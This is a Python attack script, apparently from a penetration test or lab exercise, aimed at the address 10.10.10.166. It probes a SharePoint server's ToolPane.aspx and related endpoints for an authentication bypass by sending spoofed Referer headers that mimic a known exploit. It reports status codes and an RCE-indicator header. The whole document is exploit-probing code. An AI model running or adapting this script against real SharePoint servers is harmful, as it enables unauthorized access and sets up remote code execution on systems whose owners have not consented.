# Purpose: Test Referer header authentication bypass variations
# Outcome: Check if v2 SharePoint validates Referer for auth bypass

import requests

target_base = "http://10.10.10.166"

# Test various Referer header patterns that might bypass authentication
referer_variations = [
    "/_layouts/SignOut.aspx",              # Original exploit Referer
    "/_layouts/15/SignOut.aspx",           # 15 version path
    "/signout.aspx",                        # Simple path
    "/_layouts/Authenticate.aspx",         # Authenticate endpoint
    "/_layouts/15/Authenticate.aspx",      # 15 version
    "/_layouts/close.aspx",                # Close page
    "/_layouts/15/error.aspx",             # Error page
    "/_layouts/AccessDenied.aspx",         # Access denied
    "/_vti_bin/Authentication.asmx",       # Auth web service
    "/_layouts/15/start.aspx",             # Start page
]

# Endpoints to test
test_endpoints = [
    "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
    "/_layouts/15/ToolPane.aspx",
    "/_vti_bin/WebPartPages.asmx",
    "/_api/web/currentuser",
]

print("[*] Testing Referer header variations for auth bypass...")
print(f"[*] Target: {target_base}")

for referer in referer_variations:
    print(f"\n[*] Testing Referer: {referer}")
    for endpoint in test_endpoints[:2]:  # Test first 2 endpoints
        try:
            headers = {
                "Referer": referer,
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*"
            }
            r = requests.get(f"{target_base}{endpoint}", headers=headers, timeout=10, allow_redirects=False)
            
            # Check for auth bypass indicators
            status = r.status_code
            has_rce_header = 'X-YSONET' in r.headers
            has_auth = 'WWW-Authenticate' not in r.headers or status == 200
            
            print(f"    {endpoint}: {status} - RCE:{has_rce_header} AuthBypass:{has_auth}")
            if status == 200:
                print(f"        Body preview: {r.text[:150]}")
        except Exception as e:
            print(f"    {endpoint}: Error - {e}")

# Also test POST requests like the original exploit
print("\n[*] Testing POST with Referer header...")
test_body = "MSOTlPn_DWP=test"
for referer in referer_variations[:3]:
    try:
        headers = {
            "Referer": referer,
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        }
        r = requests.post(f"{target_base}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&foo=/ToolPane.aspx",
                         headers=headers, data=test_body, timeout=10, allow_redirects=False)
        print(f"    Referer={referer}: {r.status_code}")
    except Exception as e:
        print(f"    Referer={referer}: Error - {e}")

print("\n[*] Referer bypass test complete")
